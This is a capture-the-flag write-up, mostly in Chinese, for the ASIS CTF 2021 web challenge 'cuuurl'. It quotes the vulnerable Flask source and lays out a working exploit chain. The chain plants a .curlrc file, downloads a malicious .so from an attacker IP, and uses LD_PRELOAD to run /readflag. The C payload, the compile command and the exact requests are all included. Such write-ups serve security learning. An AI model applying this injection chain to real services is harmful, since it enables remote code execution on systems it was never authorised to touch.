---
title: ASIS CTF 2021
date: 2021-12-30 10:58:00
category: CTF Writeup
tags: 
	- ASIS CTF
---

## Web

### cuuurl

```
Do you know how to pronounce "curl"?
Download source code from here.
```

核心代码：

```python
@app.route('/')
def index(): #Poor coding skills :( can't even get process output properly
	url = request.args.get('url') or "http://localhost:8000/sayhi"
	env = request.args.get('env') or None
	outputFilename = request.args.get('file') or "myregrets.txt"
	outputFolder = f"./outputs/{hashlib.md5(request.remote_addr.encode()).hexdigest()}"
	result = ""

	if(env):
		env = env.split("=")
		env = {env[0]:env[1]}
	else:
		env = {}

	# print("env: ", env)

	master, slave = pty.openpty()
	os.set_blocking(master,False)
	try:
		subprocess.run(["/usr/bin/curl","--url",url],stdin=slave,stdout=slave,env=env,timeout=3,)
		result = os.read(master,0x4000)
	except Exception as e:
		os.close(slave)
		os.close(master)
		report = str(e)
		report += "\nurl: " + url + "\nenv: " + str(env) + "\noutputFilename: " + outputFilename
		return report,200,{'content-type':'text/plain;charset=utf-8'}

	os.close(slave)
	os.close(master)

	if(not os.path.exists(outputFolder)):
		os.mkdir(outputFolder)

	if("/" in outputFilename):
		outputFilename = secrets.token_urlsafe(0x10)

	with open(f"{outputFolder}/{outputFilename}","wb") as f:
		f.write(result)

	return redirect(f"/view?file={outputFilename}", code=302)
```

题目业务逻辑为：

-   使用curl命令访问任意url并写入内容到指定目录的任意命名的文件下，同时可以配置环境变量env
-   通过/view下传参文件名，访问文件内容

一开始尝试file://协议读取flag，发现没有权限，但是给了一个binary文件可以读取flag

```dockerfile
RUN chmod 400 /flag.txt
RUN chmod 111 /readflag
RUN chmod +s /readflag
```

因此思路是想办法执行根目录下readflag文件，得到flag

因为文件名可以任意写，且目录已知，通过curl官方文档 [curl - How To Use](https://curl.se/docs/manpage.html#CURLHOME) 可以得知curl会首先寻找HOME环境变量目录下的.curlrc文件作为配置文件，在.curlrc文件中可以任意添加curl的参数。而env环境变量可以通过请求指定，确保能够访问到.curlrc文件。

所以可以写个.so文件然后通过env变量LD_PRELOAD执行.so文件，进而执行readfile。.curlrc文件如下：

```
--output /tmp/test.so
```

test.c：

```c
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    system("/readflag");
}
```

编译成.so文件：

```bash
gcc -fPIC -shared -o test.so test.c -nostartfiles
```

最后调整GET请求参数就可以拿下flag了~

```http
GET /?url=http://IP/curlrc.txt&env=&file=.curlrc HTTP/1.1
GET /?url=http://IP/test.so&env=HOME=/app/outputs/DIRECTORY&file= HTTP/1.1 // 发送这个请求的时候服务器会返回报错，但是实际上已经执行成功了。调试发现具体报错为：[Errno 11] Resource temporarily unavailable，但并没有找到很好的解释为什么会报这个错误
GET /?url=http://IP/&env=LD_PRELOAD=/tmp/test.so&file= HTTP/1.1
GET /view?file=myregrets.txt HTTP/1.1
```




